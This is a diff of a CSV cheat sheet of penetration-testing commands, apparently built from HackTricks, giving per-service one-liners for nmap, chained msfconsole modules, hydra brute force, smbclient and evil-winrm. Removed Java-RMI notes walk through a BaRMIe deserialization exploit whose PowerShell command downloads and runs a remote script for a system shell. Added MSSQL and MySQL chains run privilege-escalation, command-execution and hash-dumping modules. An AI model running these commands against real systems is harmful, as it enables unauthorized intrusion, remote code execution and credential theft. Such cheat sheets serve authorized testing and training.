Diff between current HackTricks-Automatic-Commands/Main.csv and the newest csv
            old_csv = 99 lines
            new_csv = 89 lines
            total   = -10 new lines
            
            2,6c2,7
< WHOIS,43,WHOIS,Notes,Notes for WHOIS,"#WHOIS (pronounced as the phrase ""who is"") is a query and response protocol that is widely used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block or an autonomous system, but is also used for a wider range of other information.
< 
< https://book.hacktricks.xyz/pentesting/pentesting-smtp
< ",Verified,1
< WHOIS,43,WHOIS,Banner Grab,Grab WHOIS Banner,whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43,Verified,2
---
> Nmap,Nmap,Generic Scans,Kickoff Scan,"Quick scan, Version scan, All Port Scan, UDP Scan ran one at a time in order",nmap -Pn {IP} && nmap -Pn -sS -p- {IP} && nmap -sC -sV -Pn {IP} && nmap -p- -Pn {IP} && sudo nmap -Pn -p- -sU {IP},Verified,1
> Nmap,Nmap,Generic Scans,Quick Scan,Quick Nmap Scan,nmap {IP},Verified,2
> Nmap,Nmap,Generic Scans,Version Scan,Scan for the Version of the Open Ports,nmap -sC -sV {IP},Verified,3
> Nmap,Nmap,Generic Scans,All Port Scan,Scan for all open ports,nmap -p- -Pn {IP},Verified,4
> Nmap,Nmap,Generic Scans,Quiet Scan,Scan Quietly,nmap -Pn -sS -p- {IP},Verified,5
> Nmap,Nmap,Generic Scans,UDP Scan,Scan for Open UDP Ports,nmap -Pn -p- -sU {IP},Verified,6
12a14
> IMAP,"143,993",Internet Message Access Protocol,consolesless mfs enumeration,IMAP enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/imap/imap_version; set RHOSTS {IP}; set RPORT 143; run; exit',Verified,4
42a45
> MySql,3306,MySql,MySql consolesless mfs enumeration,MySql enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit',Verified,4
56,75d58
< DNS,53,Domain Name Service,Notes,Notes for DNS,"##These are the commands I run every time I see an open DNS port
< 
< dnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name}
< dnsrecon -r 127.0.1.0/24 -n {IP} -d {Domain_Name}
< dnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name}
< dig axfr @{IP}
< dig axfr {Domain_Name} @{IP}
< nslookup
<     SERVER {IP}
<     127.0.0.1
<     {IP}
<     Domain_Name
<     exit
< 
< https://book.hacktricks.xyz/pentesting/pentesting-dns
< ",Verified,1
< DNS,53,Domain Name Service,Banner Grab,Grab DNS Banner,dig version.bind CHAOS TXT @DNS,Verified,2
< DNS,53,Domain Name Service,Nmap Vuln Scan,Scan for Vulnerabilities with Nmap,"nmap -n --script ""(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"" {IP}",Verified,3
< DNS,53,Domain Name Service,Zone Transfer,Three attempts at forcing a zone transfer,dig axfr @{IP} && dix axfr @{IP} {Domain_Name} && fierce -dns {Domain_Name},Verified,4
< DNS,53,Domain Name Service,Active Directory,Eunuerate a DC via DNS,"dig -t _gc._{Domain_Name} && dig -t _ldap._{Domain_Name} && dig -t _kerberos._{Domain_Name} && dig -t _kpasswd._{Domain_Name} && nmap --script dns-srv-enum --script-args ""dns-srv-enum.domain={Domain_Name}""",Verified,5
85a69
> SMTP,"25,465,587",Simple Mail Transfer Protocol,consolesless mfs enumeration,SMTP enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit',Verified,8
101a86
> FTP,21,File Transfer Protocol,consolesless mfs enumeration ftp,FTP enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' &&  msfconsole -q -x 'use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS {IP}; set RPORT 21; run; exit',Verified,7
107,129d91
< WinRM,5985,Windows Remote Managment,Notes,Notes for WinRM,"#Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.
< 
< sudo gem install winrm winrm-fs colorize stringio 
< git clone https://github.com/Hackplayers/evil-winrm.git 
< cd evil-winrm
< ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’
< 
< https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/
< 
< ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
< ^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
< menu
< invoke-binary `tab`
< 
< #python3
< import winrm
< s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
< print(s.run_cmd('ipconfig'))
< print(s.run_ps('ipconfig'))
< 
< https://book.hacktricks.xyz/pentesting/pentesting-winrm
< ",Verified,1
< WinRM,5985,Windows Remote Managment,Hydra Brute Force,Need User,hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP},Verified,2
164a127
> MSSQL,1433,Microsoft SQL Server,MSSQL consolesless mfs enumeration,MSSQL enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit',Verified,3
166c129
< Kerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is responsability of each service to determine if the user has access to its resources.
---
> Kerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is the responsability of each service to determine if the user has access to its resources.
197,216c160,161
< Java-RMI,1098,Java Remote Method Inclusion,Notes,Notes for Java-RMI,"#The Java Remote Method Invocation, or Java RMI, is a mechanism that allows an object that exists in one Java virtual machine to access and call methods that are contained in another Java virtual machine; This is basically the same thing as a remote procedure call, but in an object-oriented paradigm instead of a procedural one, which allows for communication between Java programs that are not in the same address space.
< 
< nmap -sC -sV -Pn 10.11.1.73 -p 1100 
<     may dump the reg of the java-rmi instance. If this is the case the machine may be vulnerable to a deserializaion exploit.
<     BaRMIe.jar is the way to go to directly exploit this vulnerability.
<     https://github.com/NickstaDB/BaRMIe/releases/tag/v1.01      is where the latest build is hosted, pre-built
< 
< useage
<     java -jar BaRMIe_v1.01.jar -attack 10.11.1.73 1100
<     target select)          1
<     available attacks)    1 (illegal bind deserialization)
<     payloads)                1 (Apache Common Collections 3.1 worked for me, others may also work)
<     OS Command)         powershell.exe -command ""IEX(new-object net.webclient).downloadstring('http://192.168.119.167:80/3232.ps1')""
< 
<     enjoy your system shell!
< 
< https://book.hacktricks.xyz/pentesting/1099-pentesting-java-rmi
< ",Verified,1
< Java-RMI,1098,Java Remote Method Inclusion,Nmap RMI,Nmap with RMI Scripts,"nmap -sV --script ""rmi-dumpregistry or rmi-vuln-classloader"" -p 1098 {IP}",Verified,2
< Java-RMI,1098,Java Remote Method Inclusion,Nmap register,Dump register of java-rmi instance,nmap -sC -sV -Pn {IP} -p 1100,Verified,3
---
> Telnet,23,Telnet,consoleless mfs enumeration,Telnet enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_version; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS {IP}; set RPORT 23; run; exit',Verified,4
> Java RMI,"1090,1098,1099,1199,4443-4446,8999-9010,9999",Java Remote Method Invocation,Enumeration,Perform basic enumeration of an RMI service,rmg enum {IP} {PORT},Verified,1
244a190
> smbmap -H {IP} -u guest
250a197
> crackmapexec smb {IP} --pass-pol -u ""guest"" -p """"
258,259c205,206
< smbclient -h ""\\\\{IP}\\\"" -U {Domain_Name} -W {Username} -l {IP}
< smbclient -h ""\\\\{IP}\\\"" -U {Domain_Name} -W {Username} -l {IP} --pw-nt-hash `hash`
---
> smbclient ""\\\\{IP}\\\"" -U {Username} -W {Domain_Name} -l {IP}
> smbclient ""\\\\{IP}\\\"" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
271,279c218
< POP,110,Post Office Protocol,Notes,Notes for POP,"#Post Office Protocol (POP) is a type of computer networking and Internet standard protocol that extracts and retrieves email from a remote mail server for access by the host machine. POP is an application layer protocol in the OSI model that provides end users the ability to fetch and receive email (from here).
< The POP clients generally connect, retrieve all messages, store them on the client system, and delete them from the server. There are 3 versions of POP, but POP3 is the most used one.
< 
< https://book.hacktricks.xyz/pentesting/pentesting-whois
< ",Verified,1
< POP,110,Post Office Protocol,Banner Grab,Banner Grab 110,nc -nv {IP} 110,Verified,2
< POP,110,Post Office Protocol,Banner Grab 995,Grab Banner Secure,openssl s_client -connect {IP}:995 -crlf -quiet,Verified,3
< POP,110,Post Office Protocol,Nmap,Scan for POP info,"nmap --script ""pop3-capabilities or pop3-ntlm-info"" -sV -p 110 {IP}",Verified,4
< POP,110,Post Office Protocol,Hydra Brute Force,Need User,hydra -l {Username} -P {Big_Passwordlist} -f {IP} pop3 -V,Verified,5
---
> SMB,"137,138,139",Server Message Block,SMB/SMB2 139/445 consolesless mfs enumeration,SMB/SMB2 139/445  enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit',Verified,6
281,285c220
< NTP,123,Network Time Protocol,Notes,Notes for NTP,"#The Network Time Protocol (NTP) is a networking protocol for clock synchronization between computer systems over packet-switched, variable-latency data networks.
< 
< https://book.hacktricks.xyz/pentesting/pentesting-ntp
< ",Verified,1
< NTP,123,Network Time Protocol,Nmap,Enumerate NTP,"nmap -sU -sV --script ""ntp* and (discovery or vuln) and not (dos or brute)"" -p 123 {IP}",Verified,2
---
> SSH,22,Secure Shell Hardening,consolesless mfs enumeration,SSH enumeration without the need to run msfconsole,msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit',Verified,2
291,296d225
< Nmap,Nmap,Generic Scans,Kickoff Scan,"Quick scan, Version scan, All Port Scan, UDP Scan ran one at a time in order",nmap -Pn {IP} && nmap -Pn -sS -p- {IP} && nmap -sC -sV -Pn {IP} && nmap -p- -Pn {IP} && sudo nmap -Pn -p- -sU {IP},Verified,1
< Nmap,Nmap,Generic Scans,Quick Scan,Quick Nmap Scan,nmap {IP},Verified,2
< Nmap,Nmap,Generic Scans,Version Scan,Scan for the Version of the Open Ports,nmap -sC -sV {IP},Verified,3
< Nmap,Nmap,Generic Scans,All Port Scan,Scan for all open ports,nmap -p- -Pn {IP},Verified,4
< Nmap,Nmap,Generic Scans,Quiet Scan,Scan Quietly,nmap -Pn -sS -p- {IP},Verified,5
< Nmap,Nmap,Generic Scans,UDP Scan,Scan for Open UDP Ports,nmap -Pn -p- -sU {IP},Verified,6